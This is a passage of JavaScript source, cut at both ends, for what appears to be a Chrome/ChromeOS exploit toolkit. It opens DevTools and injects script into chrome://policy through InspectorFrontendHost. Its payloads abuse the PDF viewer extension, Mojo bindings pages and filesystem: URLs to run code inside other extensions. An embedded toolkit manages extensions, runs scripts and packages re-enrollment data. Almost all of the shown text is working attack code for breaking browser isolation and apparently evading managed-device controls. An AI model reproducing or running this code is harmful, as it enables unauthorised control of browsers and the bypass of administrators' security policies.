                 zip.file(baseName, buffer);
                 filesAdded++;
             } catch (error) {
                 this.statusP.textContent = \`Skipped \${baseName}.\`;
                 console.error(\`Failed to read/add \${f}:\`, error);
                 // Continue even if a file fails
                  await new Promise(resolve => setTimeout(resolve, 50)); // Tiny delay
             }
         }

         // 3. Generate and Download
         if (filesAdded === 0) {
             this.statusP.textContent = "Error: No files could be added.";
             this.packageButton.disabled = false;
             return;
         }

         this.statusP.textContent = \`Generating zip (\${filesAdded} file(s))...\`;
         try {
             const blob = await zip.generateAsync({ type: "blob" });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
             a.download = \`reenrollment_data_\${Date.now()}.zip\`;
             a.style.display = 'none';
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
             this.statusP.textContent = \`Download started (\${filesAdded} file(s)).\`;
         } catch (error) {
             console.error("Error generating/downloading zip:", error);
             this.statusP.textContent = \`Error generating zip: \${error.message}\`;
         } finally {
             this.packageButton.disabled = false;
         }
    }
}

class SystemInfo {
     constructor(containerId) {
        this.container = document.getElementById(containerId);
        this.render();
    }

     render() {
         this.container.innerHTML = uiTemplates.systemInfo;
         this.infoPre = this.container.querySelector('#platform-info');
         this.loadInfo();
     }

     async loadInfo() {
         this.infoPre.textContent = "Loading...";
         try {
             const platformInfo = await chromePromise(chrome.runtime.getPlatformInfo);
             const manifest = chrome.runtime.getManifest(); // Get info about this extension

             let infoText = \`--- Platform ---\\n\`;
             infoText += \`OS: \${platformInfo.os}\\n\`;
             infoText += \`Arch: \${platformInfo.arch}\\n\`;
             infoText += \`NaCl Arch: \${platformInfo.nacl_arch}\\n\\n\`;

             infoText += \`--- Browser ---\\n\`;
             infoText += \`Chrome Version: \${navigator.appVersion.match(/Chrome\\/([\\d.]+)/)?.[1] || 'N/A'}\\n\`;
             infoText += \`User Agent: \${navigator.userAgent}\\n\\n\`;

             infoText += \`--- This Extension (\${manifest.name} v\${manifest.version}) ---\\n\`;
             infoText += \`ID: \${chrome.runtime.id}\\n\`;
             infoText += \`Permissions: \${manifest.permissions?.join(', ') || '(none)'}\\n\`;
             infoText += \`Host Permissions: \${manifest.host_permissions?.join(', ') || '(none)'}\`;


             this.infoPre.textContent = infoText;
         } catch (error) {
             console.error("Error getting system info:", error);
             this.infoPre.textContent = \`Error loading info: \${error.message}\`;
         }
     }
}


// --- Initialization ---

function initializeApp() {
    // Clear potential errors from previous state if re-initializing
    clearGlobalError();

    // Set up basic HTML structure (Pure JS approach)
    document.body.innerHTML = uiTemplates.mainLayout; // Use the main layout template
    document.title = "Advanced Extension Toolkit"; // Set title

    const appContainer = document.getElementById('app-container');
    if (!appContainer) {
        displayGlobalError("Fatal Error: App container not found in layout.");
        return;
    }

     // Inject feature sections - Create containers dynamically
     const sections = [
         { id: 'management-container', classRef: ExtensionManager },
         { id: 'scripting-container', classRef: ScriptingTool },
         { id: 'file-viewer-container', classRef: FileViewer },
         { id: 'system-info-container', classRef: SystemInfo },
         { id: 'reenroll-container', classRef: ReEnrollmentPackager },
     ];

     sections.forEach(section => {
         const sectionDiv = document.createElement('div');
         sectionDiv.id = section.id;
         appContainer.appendChild(sectionDiv);
         try {
            new section.classRef(section.id); // Instantiate the class
         } catch (e) {
              console.error(\`Failed to initialize section \${section.id}:\`, e);
              displayGlobalError(\`Error initializing section: \${section.id}\`);
              const errorPlaceholder = document.createElement('div');
              errorPlaceholder.style.color = 'red';
              errorPlaceholder.textContent = \`Failed to load \${section.id.replace('-container','')}. Check console.\`;
              sectionDiv.appendChild(errorPlaceholder);
         }
     });


     // Add CSS dynamically
     const style = document.createElement('style');
     style.textContent = \`
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; margin: 0; padding: 10px; background-color: #f0f0f0; font-size: 14px; }
        #app-container { background-color: #fff; padding: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; text-align: center; color: #333; }
        h2 { margin-top: 0; border-bottom: 1px solid #eee; padding-bottom: 8px; margin-bottom: 15px; font-size: 1.2em; color: #444; }
        .feature-section { border: 1px solid #e0e0e0; padding: 15px; margin-bottom: 20px; background-color: #fdfdfd; border-radius: 4px; }
        button { padding: 6px 12px; margin: 3px; cursor: pointer; border: 1px solid #ccc; border-radius: 3px; background-color: #f7f7f7; color: #333; font-size: 0.95em; }
        button:hover { background-color: #e9e9e9; border-color: #bbb; }
        button:disabled { cursor: not-allowed; opacity: 0.6; }
        input[type=text], input[type=password], textarea, select { padding: 6px; margin: 3px; border: 1px solid #ccc; border-radius: 3px; font-size: 1em; box-sizing: border-box; }
        textarea { width: 100%; vertical-align: top; resize: vertical; min-height: 80px; }
        select { min-width: 150px; }
        pre { background-color: #f4f4f4; padding: 8px; margin-top: 5px; border: 1px solid #ddd; max-height: 200px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; font-family: Menlo, Monaco, Consolas, "Courier New", monospace; font-size: 0.9em; }
        table { border-collapse: collapse; width: 100%; }
        th, td { padding: 6px 8px; text-align: left; border-bottom: 1px solid #eee; vertical-align: middle; }
        th { font-weight: bold; background-color: #f9f9f9; }
        #global-error-display { border: 1px solid #ff4d4d; background-color: #ffe6e6; color: #cc0000; }
        #notes-section { color: #666; font-size: 0.85em; }
        #reenroll-status, #ext-list-container i { color: #555; font-style: italic; }
     \`;
     document.head.appendChild(style);

    console.log("Advanced Toolkit Initialized.");
}

// --- Run Initialization ---
// Ensure DOM is ready before manipulating it
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeApp);
} else {
    // DOMContentLoaded has already fired
    initializeApp();
}
`;
    const PLACEHOLDER_EXT_JS_B64 = btoa(prevToolkitJS);

    // 2. EXTHTML (Base64 of minimal HTML to load the JS)
    const extHtmlContent = `<!DOCTYPE html><html><head><title>Payload</title></head><body><p>Loading toolkit...</p><!-- Content generated by index.js --></body></html>`;
    const PLACEHOLDER_EXT_HTML_B64 = btoa(extHtmlContent); // Script tag added later by payload_swamp

    // 3. CHROMEPAYLOAD (Base64 of JS for Mojo context)
    const chromePayloadJS = `console.log('Chrome Payload Executed in:', window.location.href); try { alert('Chrome Payload Executed!'); } catch(e){ console.error('Alert failed in payload:', e);}`;
    const PLACEHOLDER_CHROME_PAYLOAD_B64 = btoa(chromePayloadJS);

    // 4. HTMLENTRY (Base64 of the DevTools UI HTML - using fallback from original)
    const PLACEHOLDER_HTML_ENTRY_B64 = "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5EYXNoYm9hcmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+RGV2VG9vbHMgSW50ZXJmYWNlPC9oMT4KPHA+QWN0aW9uczo8L3A+Cjx1bD4KCTxsaT48YnV0dG9uIGlkPSJhY3RpdmF0ZSI+QWN0aXZhdGUgKERlZmF1bHQgUERGKTwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0iYWN0aXZhdGUyIj5BY3RpdmF0ZSBTcGVjaWFsIChYRCBQREYpPC9idXR0b24+PC9saT4KCTxsaT48YnV0dG9uIGlkPSJleHRkYmciPkRlYnVnIE90aGVyIEV4dGVuc2lvbjwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0iY2xlYW51cCI+Q2xlYW51cCBGaWxlc3lzdGVtPC9idXR0b24+PC9saT4KCTxsaT48YnV0dG9uIGlkPSJkZXZkYmciPkRlYnVnIERldlRvb2xzIChFdmFsKTwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0idXBkYXRlciI+Q2hlY2sgZm9yIFVwZGF0ZXI8L2J1dHRvbj48L2xpPgo8L3VsPgo8cD5IYXJkY29kZWQgRXh0ZW5zaW9uczo8L3A+CjwhLS0gQWRkIG1vcmUgaGFyZGNvZGVkIGJ1dHRvbnMgYXMgbmVlZGVkIC0tPgo8dWwgY2xhc3M9ImhhcmRjb2RlZC1saXN0Ij4KICAgIDxsaT48YnV0dG9uIGNsYXNzPSJoYXJkY29kZWQiIGV4dD0iZWplbWRkaWhlbmtvZGZoZWxtZmJhaGdjaWdrYWZpZGMiPkV4YW1wbGUgRXh0IDGPC9idXR0b24+PC9saT4KICAgIDxsaT48YnV0dG9uIGNsYXNzPSJoYXJkY29kZWQiIGV4dD0ibmhwaXBkZ2VhbGdkbWxkZGVtYWZubGlsa2lvZ25kYSI+RXhhbXBsZSBFeHQgMjwvYnV0dG9uPjwvbGk+CjwvdWw+CjxoMj5Mb2dnZWQgSWZyYW1lczo8L2gyPgo8cHJlIGlkPSJsb2ciPjwvcHJlPgo8L2JvZHk+CjwvaHRtbD4=";


    // --- Utility Functions ---

    /**
     * Pauses execution for a specified duration.
     * @param {number} ms - Milliseconds to sleep.
     * @returns {Promise<void>}
     */
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Safely gets the window.opener, defaulting to the current window if none exists.
     * @returns {Window} The opener or the current window.
     */
    function getOpener() {
        try {
            return window.opener || window;
        } catch (e) {
            console.warn("Could not access window.opener, defaulting to current window.", e);
            return window;
        }
    }

    /**
     * Writes data to a file in the temporary filesystem.
     * @param {FileSystem} fs - The filesystem object.
     * @param {string} filename - The name of the file to write.
     * @param {string | Blob} data - The data to write.
     * @returns {Promise<string>} A promise resolving with the file's URL (filesystem:...).
     */
    function writeFile(fs, filename, data) {
        return new Promise((resolve, reject) => {
            fs.root.getFile(filename, { create: true }, (fileEntry) => {
                fileEntry.createWriter((fileWriter) => {
                    fileWriter.onwriteend = () => resolve(fileEntry.toURL());
                    fileWriter.onerror = (e) => reject(new Error(`Failed to write file ${filename}: ${e.toString()}`));
                    const blobData = data instanceof Blob ? data : new Blob([data]);
                    fileWriter.write(blobData);
                }, (e) => reject(new Error(`Failed to create writer for ${filename}: ${e.toString()}`)));
            }, (e) => reject(new Error(`Failed to get file entry for ${filename}: ${e.toString()}`)));
        });
    }

    /**
     * Removes a file from the temporary filesystem.
     * @param {FileSystem} fs - The filesystem object.
     * @param {string} filename - The name of the file to remove.
     * @returns {Promise<void>} A promise resolving when the file is removed.
     */
    function removeFile(fs, filename) {
        return new Promise((resolve, reject) => {
            fs.root.getFile(filename, { create: false }, // Don't create if it doesn't exist
                (fileEntry) => {
                    fileEntry.remove(resolve, (e) => reject(new Error(`Failed to remove file ${filename}: ${e.toString()}`)));
                },
                (e) => {
                    // If file not found, resolve successfully as it's already "removed"
                    if (e.name === 'NotFoundError') {
                        resolve();
                    } else {
                        reject(new Error(`Failed to get file entry for removal ${filename}: ${e.toString()}`));
                    }
                }
            );
        });
    }

    /**
     * Requests and uses the temporary filesystem.
     * Warning: webkitRequestFileSystem is deprecated and non-standard.
     * @param {function(FileSystem): Promise<any>} callback - Async function to execute with the filesystem.
     * @returns {Promise<any>} Result of the callback.
     */
    async function withTempFileSystem(callback) {
        return new Promise((resolve, reject) => {
            if (!window.webkitRequestFileSystem) {
                return reject(new Error("webkitRequestFileSystem API is not available."));
            }
            window.webkitRequestFileSystem(window.TEMPORARY, 5 * 1024 * 1024, // 5MB quota
                async (fs) => {
                    try {
                        resolve(await callback(fs));
                    } catch (error) {
                        reject(error);
                    }
                }, (e) => reject(new Error(`Failed to request filesystem: ${e.toString()}`))
            );
        });
    }


    // --- Core Logic: DevTools Interaction ---

    /**
     * Opens the DevTools window and waits for the DevToolsAPI to be available.
     * @param {Window} openerWindow - The window object used to open DevTools.
     * @returns {Promise<Window>} The DevTools window object with DevToolsAPI available.
     * @throws {Error} If DevTools cannot be opened or the API doesn't load.
     */
    async function openDevToolsAndGetAPI(openerWindow) {
        console.log("Attempting to open DevTools...");
        const devtoolsWindow = openerWindow.open(DEVTOOLS_URL);
        if (!devtoolsWindow) {
            throw new Error("Failed to open DevTools window. Popup blocker maybe?");
        }

        // Close the original opener window immediately after launching devtools
        try {
            if (openerWindow !== window) { // Avoid closing self if opener defaulted to window
               openerWindow.close();
            }
        } catch (e) {
            console.warn("Could not close opener window:", e);
        }


        return new Promise((resolve, reject) => {
            let attempt = 0;
            const maxAttempts = 3; // Limit reload attempts
            let resolved = false; // Flag to prevent multiple resolves/rejects

            const checkApi = async () => {
                if (resolved) return; // Already handled
                console.log("Checking for DevToolsAPI...");
                try {
                    // Accessing properties on a potentially closed/cross-origin window needs try-catch
                    if (devtoolsWindow && !devtoolsWindow.closed && devtoolsWindow.DevToolsAPI) {
                        console.log("Got DevToolsAPI object from opened window:", devtoolsWindow.DevToolsAPI);
                        resolved = true;
                        resolve(devtoolsWindow);
                    } else if (!devtoolsWindow || devtoolsWindow.closed) {
                        if (!resolved) {
                             resolved = true;
                             reject(new Error("DevTools window closed before API was found."));
                        }
                    } else if (attempt < maxAttempts) {
                        attempt++;
                        console.warn(`DevToolsAPI not found (Attempt ${attempt}/${maxAttempts}). Reloading DevTools window...`);
                        try {
                            devtoolsWindow.opener = null;
                            devtoolsWindow.location.reload();
                            // Re-attach listener after reload attempt
                            devtoolsWindow.addEventListener("DOMContentLoaded", checkApi, { once: true });
                            setTimeout(() => { // Timeout safeguard
                                 if(!resolved && devtoolsWindow && !devtoolsWindow.closed && !devtoolsWindow.DevToolsAPI) {
                                    console.error(`DevToolsAPI still not found after reload attempt ${attempt} and timeout.`);
                                 } else if (!resolved && (!devtoolsWindow || devtoolsWindow.closed)) {
                                     if (!resolved) {
                                        resolved = true;
                                        reject(new Error(`DevTools window closed during reload attempt ${attempt}.`));
                                     }
                                 }
                            }, 5000);
                        } catch (e) {
                            if (!resolved) {
                                resolved = true;
                                reject(new Error(`Failed during DevTools reload attempt ${attempt}: ${e}`));
                            }
                        }
                    } else {
                        if (!resolved) {
                            resolved = true;
                            try { if (!devtoolsWindow.closed) devtoolsWindow.close(); } catch (e) {}
                            reject(new Error(`Failed to get DevToolsAPI after ${maxAttempts} attempts.`));
                        }
                    }
                } catch (e) {
                     // Catch errors accessing devtoolsWindow properties if it's closed or cross-origin
                     if (!resolved) {
                         resolved = true;
                         console.error("Error accessing devtoolsWindow:", e);
                         reject(new Error(`Error checking DevTools window state: ${e.message}`));
                     }
                }
            };

            // Use DOMContentLoaded and load, plus timeouts
            try {
                devtoolsWindow.addEventListener("DOMContentLoaded", checkApi, { once: true });
                devtoolsWindow.addEventListener("load", checkApi, { once: true }); // Fallback if DOMContentLoaded fails

                setTimeout(() => {
                   if(!resolved && devtoolsWindow && !devtoolsWindow.closed && !devtoolsWindow.DevToolsAPI) {
                       console.warn("DevToolsAPI not found after initial load timeout. Relying on events.");
                   } else if (!resolved && (!devtoolsWindow || devtoolsWindow.closed)) {
                       if(!resolved) {
                           resolved = true;
                           reject(new Error("DevTools window closed during initial wait."));
                       }
                   }
                }, 3000); // Initial timeout
            } catch (e) {
                 if (!resolved) {
                     resolved = true;
                     console.error("Error setting up initial DevTools listeners:", e);
                     reject(new Error(`Setup error: ${e.message}`));
                 }
            }
        });
    }


    // --- Core Logic: Exploit/Debug UI ---

    /**
     * This function is intended to be stringified and executed in the DevTools context.
     * It sets up a UI and logic for interacting with/debugging extensions.
     */
    function devToolsUI() {
        // --- UI Scope Constants ---
        const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition required for stringified context
        const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js"; // Redefinition required
        const IFRAME_TRACKER_EVENT_REMOVE = 'removeIframe'; // Redefinition required
        const IFRAME_PARENT_MESSAGE_TYPE_ACC = 'acc'; // Redefinition required
        const IFRAME_PARENT_MESSAGE_TYPE_ACK = 'ack'; // Redefinition required
        const BROWSER_INIT_NAVIGATE_EVENT = 'browserInitNavigate'; // Redefinition required
        const UPDATER_WEBSOCKET_PLACEHOLDER = "ws://%%updaterurl%%"; // Redefinition required

        // --- Placeholders (Values will be injected when stringified) ---
        const PLACEHOLDER_HTML_ENTRY_B64 = "%%PLACEHOLDER_HTML_ENTRY_B64%%";
        const PLACEHOLDER_EXT_JS_B64 = "%%PLACEHOLDER_EXT_JS_B64%%";
        const PLACEHOLDER_EXT_HTML_B64 = "%%PLACEHOLDER_EXT_HTML_B64%%";
        const PLACEHOLDER_CHROME_PAYLOAD_B64 = "%%PLACEHOLDER_CHROME_PAYLOAD_B64%%";

        // --- UI State ---
        const iframeManager = {
            iframes: {}, nextId: 0,
            add: function(iframeElement) { const id = this.nextId++; iframeElement.dataset.managedId = id; this.iframes[id] = iframeElement; return id; },
            remove: function(id) { const iframe = this.iframes[id]; if (iframe) { try { iframe.remove(); } catch(e){} delete this.iframes[id]; console.log(`Removed tracked iframe: ${id}`); } },
            get: function(id) { return this.iframes[id]; }
        };

        // --- Filesystem Payloads ---

        /** Payload executed within an extension's context via filesystem/iframe trick. */
        function payload_swamp(targetWindow, dataFromParent) {
            const PDF_EXTENSION_ID = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js";
            const PLACEHOLDER_EXT_JS_B64_INNER = "%%PLACEHOLDER_EXT_JS_B64%%"; // Need placeholders inside too
            const PLACEHOLDER_EXT_HTML_B64_INNER = "%%PLACEHOLDER_EXT_HTML_B64%%";
            const PLACEHOLDER_CHROME_PAYLOAD_B64_INNER = "%%PLACEHOLDER_CHROME_PAYLOAD_B64%%";

            // Utility to signal parent to remove the iframe
            function cleanup() {
                if (window.parent && window.parent.postMessage && dataFromParent && typeof dataFromParent.passcode !== 'undefined') {
                     window.parent.postMessage({ type: 'removeIframe', uid: dataFromParent.passcode }, '*');
                } else { console.warn("Cleanup could not message parent."); }
                 try { window.close(); } catch(e) {}
            }

            // Specific logic for PDF extension
            if (location.origin === "chrome-extension://" + PDF_EXTENSION_ID) {
                console.log("Running payload inside PDF Viewer context.");
                try{ targetWindow.close(); } catch(e){} // Close the opened intermediate window/tab
                 if (typeof chrome !== 'undefined' && chrome.tabs && chrome.windows) {
                     chrome.tabs.getCurrent((currentTabInfo) => {
                        if (chrome.runtime.lastError) { console.error("Error getting current tab:", chrome.runtime.lastError.message); cleanup(); return; }
                         chrome.windows.create({ setSelfAsOpener: true, url: MOJO_BINDINGS_URL }, (newWindowInfo) => {
                            if (chrome.runtime.lastError) { console.error("Error creating window:", chrome.runtime.lastError.message); cleanup(); return; }
                             if (newWindowInfo && newWindowInfo.tabs && newWindowInfo.tabs.length > 0) {
                                const mojoTabId = newWindowInfo.tabs[0].id;
                                const codeToExecute = `location.href = "javascript:" + decodeURIComponent(escape(atob('${PLACEHOLDER_CHROME_PAYLOAD_B64_INNER}')))`;
                                console.log("Executing script in new Mojo tab (first 100 chars):", codeToExecute.substring(0,100));
                                chrome.tabs.executeScript(mojoTabId, { code: codeToExecute }, () => {
                                    if (chrome.runtime.lastError) { console.error("Error executing script in Mojo tab:", chrome.runtime.lastError.message); }
                                    else { console.log("Script execution initiated in Mojo tab."); }
                                    cleanup(); // Cleanup regardless of exec success
                                });
                             } else { console.error("Failed to get tab info from newly created window."); cleanup(); }
                        });
                     });
                 } else { console.error("Chrome APIs (tabs, windows) not available in this context."); cleanup(); }
                 return;
            }

            // Generic filesystem payload logic
            console.log("Running generic filesystem payload. Data from parent:", dataFromParent);
            if (!window.webkitRequestFileSystem) { console.error("webkitRequestFileSystem not available."); cleanup(); return; }

            window.webkitRequestFileSystem(window.TEMPORARY, 5 * 1024 * 1024, async (fs) => {
                console.log("Obtained temporary filesystem access.");
                 const writeFileFS = (name, data) => new Promise((res, rej) => fs.root.getFile(name,{create:true}, (entry) => entry.createWriter((w) => { w.onwriteend=()=>res(entry.toURL()); w.onerror=rej; w.write(new Blob([data]));},rej),rej));
                 const removeFileFS = (name) => new Promise((res, rej) => fs.root.getFile(name,{create:false}, (entry)=>entry.remove(res,rej), (e)=>(e.name==='NotFoundError'?res():rej(e))));

                try {
                    if (dataFromParent && dataFromParent.cleanup) {
                        console.log("Cleaning up filesystem files...");
                        await removeFileFS('index.js');
                        await removeFileFS('index.html');
                        console.log("Filesystem cleanup complete.");
                    } else {
                        console.log("Writing extension files to filesystem...");
                        // Decode Base64 content before writing
                        const decodedJs = decodeURIComponent(escape(atob(PLACEHOLDER_EXT_JS_B64_INNER)));
                        await writeFileFS('index.js', decodedJs);
                        const decodedHtml = decodeURIComponent(escape(atob(PLACEHOLDER_EXT_HTML_B64_INNER)));
                        const htmlContent = `${decodedHtml}<script src="./index.js"></script>`;
                        const fsUrl = await writeFileFS('index.html', htmlContent);
                        console.log(`Extension HTML written to filesystem URL: ${fsUrl}`);

                        if (targetWindow.chrome && targetWindow.chrome.tabs) {
                           targetWindow.chrome.tabs.create({ url: fsUrl });
                           console.log("Opened filesystem URL in new tab via chrome.tabs.create.");
                        } else {
                            console.warn("chrome.tabs API not available, attempting simple open().");
                            targetWindow.open(fsUrl);
                        }
                    }
                } catch (error) { console.error("Error during filesystem operation:", error); }
                 finally { try { targetWindow.close(); } catch(e){} cleanup(); }
            }, (e) => { console.error("Filesystem request failed:", e); cleanup(); });
        } // end payload_swamp

        /** Payload for the 'Activate Special (XD)' button. */
        function xdPayload(targetWindow) {
            try{ targetWindow.close(); } catch(e){} // Close intermediate window
            const MOJO_BINDINGS_URL = "chrome://resources/mojo/mojo/public/js/bindings.js";
            if (!chrome || !chrome.tabs || !chrome.windows) { alert("Required Chrome APIs missing."); return; }

            function createAndWriteFileInMojoContext() {
                 const writeFile = (name, content) => new Promise((res, rej) => { if (!window.webkitRequestFileSystem) return rej("FS API missing"); webkitRequestFileSystem(window.TEMPORARY, 2*1024*1024, (fs) => fs.root.getFile(name,{create:true},(e)=>e.createWriter((w)=>{w.onwriteend=()=>res(e.toURL());w.onerror=rej;w.write(new Blob([content]));},rej),rej),rej); });
                 const htmlContent = `<html><body><p>Loading frame...</p><iframe src="filesystem:${location.origin}/temporary/nothing.html"></iframe><script>console.log("Inner script running");if(top!==window){try{top.location.replace(location.href)}catch(e){console.error("Frame break failed:",e)}};window.onerror=console.error;</script></body></html>`;
                 (async () => { try { console.log("Mojo: Writing file..."); const url = await writeFile('index.html', htmlContent); console.log("Mojo: File written:", url); if (opener && opener.postMessage) { opener.postMessage({ url: url }, '*'); } else { console.error("Mojo: Cannot post back to opener.");} } catch (err) { console.error('Mojo Error:', err); } finally { setTimeout(() => { try{window.close();}catch(e){} }, 800); } })();
            }

            chrome.tabs.getCurrent((tab) => {
                 if (chrome.runtime.lastError || !tab) { alert(`Error getting current tab: ${chrome.runtime.lastError?.message}`); return; }
                 chrome.windows.create({ url: MOJO_BINDINGS_URL, setSelfAsOpener: true }, (winInfo) => {
                      if (chrome.runtime.lastError || !winInfo?.tabs?.length) { alert(`Error creating Mojo window: ${chrome.runtime.lastError?.message}`); return; }
                     const mojoTabId = winInfo.tabs[0].id;
                     chrome.tabs.executeScript(mojoTabId, { code: `(${createAndWriteFileInMojoContext.toString()})()` }, () => { if (chrome.runtime.lastError) { alert(`Mojo exec script error: ${chrome.runtime.lastError.message}`); } });

                     // --- Message Handling (in DevTools UI) for XD ---
                     const messageHandler = (event) => {
                         // Simplistic check - ideally verify source/origin if possible
                         // if (event.source !== winInfo.window) return;
                         if (event.data && event.data.url) {
                             console.log("XD Flow: Received filesystem URL:", event.data.url);
                             const fileSystemUrl = event.data.url;
                             window.removeEventListener('message', messageHandler); // Cleanup this listener

                             const accAckHandler = (accEvent) => {
                                 if (accEvent.data && accEvent.data.type === 'acc') {
                                     console.log("XD Flow: Received 'acc', sending 'ack'.");
                                     window.removeEventListener('message', accAckHandler); // Cleanup this listener
                                     if (accEvent.source && accEvent.source.postMessage) {
                                         accEvent.source.postMessage({ type: 'ack' }, '*'); // Consider origin
                                         console.log("XD Flow: Sent 'ack'.");
                                          // Navigation logic from original code is unclear, logging instead
                                          console.warn("XD Flow: Original code navigated top.location.replace('') here. Target is ambiguous. Skipping navigation.");
                                          // If navigation *is* desired, potential targets:
                                          // window.location.href = fileSystemUrl; // Navigate DevTools window
                                          // accEvent.source.location.href = fileSystemUrl; // Navigate the source iframe (likely intended but risky)
                                     } else { console.error("XD Flow: Cannot send 'ack', source invalid."); }
                                 }
                             };
                             window.addEventListener('message', accAckHandler);
                             console.log("XD Flow: Set up listener for 'acc' message.");
                         }
                     };
                     window.addEventListener('message', messageHandler);
                     console.log("XD Flow: Set up listener for URL message from Mojo context.");
                 });
             });
        } // end xdPayload

        // --- Main UI Setup ---
        function setupUI() {
            console.log("Setting up DevTools UI...");
            document.open();
            // Decode the Base64 HTML for the UI itself
            try {
                document.write(decodeURIComponent(escape(atob(PLACEHOLDER_HTML_ENTRY_B64))));
            } catch (e) {
                 console.error("Error decoding/writing HTML Entry Point:", e);
                 document.write("<html><body><h1>Error loading UI</h1></body></html>"); // Fallback
            }
            document.close();
            document.title = "Extension Debug Dashboard";

            if (!window.InspectorFrontendHost) {
                console.error("InspectorFrontendHost is not available!");
                // Optionally disable buttons or show a warning in the UI
                const buttons = document.querySelectorAll('button');
                 buttons.forEach(btn => {
                    if(btn.id !== 'updater' && btn.id !== 'devdbg') { // Keep updater/eval enabled maybe?
                        btn.disabled = true;
                        btn.title = "InspectorFrontendHost API not available.";
                    }
                 });
                 const heading = document.querySelector('h1');
                 if (heading) heading.textContent += " (Inspector API Missing!)";
            }

            attachEventListeners();
            console.log("DevTools UI setup complete.");
        }

        /** Attaches event listeners to the UI elements */
        function attachEventListeners() {
            document.querySelector('#activate')?.addEventListener('click', () => debugExtensionInteraction(false, PDF_EXTENSION_ID));
            document.querySelector('#activate2')?.addEventListener('click', () => debugExtensionInteraction(false, PDF_EXTENSION_ID, xdPayload.toString()));
            document.querySelector('#extdbg')?.addEventListener('click', () => debugExtensionInteraction(false));
            document.querySelectorAll('.hardcoded').forEach(el => el.addEventListener('click', () => { const id=el.getAttribute("ext"); if(id) debugExtensionInteraction(false, id); }));
            document.querySelector('#cleanup')?.addEventListener('click', () => debugExtensionInteraction(true));
            document.querySelector('#updater')?.addEventListener('click', handleUpdaterCheck);
            document.querySelector('#devdbg')?.addEventListener('click', handleDevtoolsDebugEval);
            window.addEventListener('message', handleIframeMessages);
        }

        /** Handles messages originating from the spawned iframes */
        function handleIframeMessages(event) {
            const data = event.data;
            if (data && data.type === IFRAME_TRACKER_EVENT_REMOVE && typeof data.uid !== 'undefined') {
                 iframeManager.remove(data.uid);
                 updateIframeLog();
            } else if (data && data.type === BROWSER_INIT_NAVIGATE_EVENT && data.url) {
                 console.warn(`Received ${BROWSER_INIT_NAVIGATE_EVENT}. Attempting navigation to:`, data.url);
                 if (event.source && typeof event.source.location?.replace === 'function') {
                    try { event.source.location.replace(data.url); } // Navigate source frame
                    catch (e) { console.error("Error navigating source frame:", e); }
                 } else { console.error("Cannot navigate: invalid source."); }
            }
            // 'acc'/'ack' handled within xdPayload flow
        }

        /** Initiates interaction with a target extension */
        function debugExtensionInteraction(isCleanup = false, targetExtensionId = null, specificPayload = null) {
             const extensionId = targetExtensionId || prompt('Enter Target Extension ID:');
             if (!extensionId || extensionId === "cancel") return;

             let manifestPath = '/manifest.json';
             let payloadToInject = specificPayload || payload_swamp.toString();

             // Special handling for PDF viewer
             if (extensionId === PDF_EXTENSION_ID) {
                 manifestPath = '/index.html'; // Use index.html for PDF viewer
                 console.log("Targeting PDF Viewer.");
                 // If using the default payload, handle the CHROMEPAYLOAD placeholder specifically
                 if (payloadToInject === payload_swamp.toString()) {
                     // Replace %%CHROMEPAYLOAD%% B64 placeholder within the payload_swamp string
                     payloadToInject = payloadToInject.replaceAll('%%PLACEHOLDER_CHROME_PAYLOAD_B64%%', PLACEHOLDER_CHROME_PAYLOAD_B64);

                     // Set injected script for chrome://policy (as per original structure)
                     try {
                         console.warn("Setting injected script for chrome://policy origin.");
                         // Decode the payload JS first, then append '//'
                         const policyJS = decodeURIComponent(escape(atob(PLACEHOLDER_CHROME_PAYLOAD_B64))) + '//';
                         InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', policyJS);
                     } catch (e) {
                         console.error("Failed to set injected script for chrome://policy:", e);
                         // Don't necessarily abort, but log the error
                     }
                 }
             }

             // Replace EXTJS and EXTHTML placeholders in the selected payload string
             payloadToInject = payloadToInject.replaceAll('%%PLACEHOLDER_EXT_JS_B64%%', PLACEHOLDER_EXT_JS_B64);
             payloadToInject = payloadToInject.replaceAll('%%PLACEHOLDER_EXT_HTML_B64%%', PLACEHOLDER_EXT_HTML_B64);
             // Ensure CHROMEPAYLOAD is replaced if not PDF context (or handled above)
             payloadToInject = payloadToInject.replaceAll('%%PLACEHOLDER_CHROME_PAYLOAD_B64%%', PLACEHOLDER_CHROME_PAYLOAD_B64);

             // --- Injection Script Wrapper ---
             const injectionWrapper = `
                console.log("Injection wrapper running in " + location.origin);
                window.cleanup = () => { if (window.sys?.passcode !== undefined) { window.parent?.postMessage({ type: '${IFRAME_TRACKER_EVENT_REMOVE}', uid: window.sys.passcode }, '*'); } };
                window.onmessage = (event) => {
                     if (event.data?.passcode !== undefined) {
                        window.sys = event.data;
                        window.onmessage = null; // Process only once
                        const targetPath = '${manifestPath}';
                        const targetUrl = new URL(targetPath, location.origin).href;
                        console.log("Opening target:", targetUrl);
                        const targetWindow = window.open(targetUrl);
                        if (targetWindow) {
                             targetWindow.onload = () => {
                                console.log("Target window loaded:", targetUrl);
                                try { (${payloadToInject})(targetWindow, window.sys); }
                                catch (e) { console.error("Payload exec error:", e); window.cleanup(); try{targetWindow.close();}catch(e){} }
                            };
                            targetWindow.onerror = (e) => { console.error("Target window load error:", targetUrl, e); window.cleanup(); };
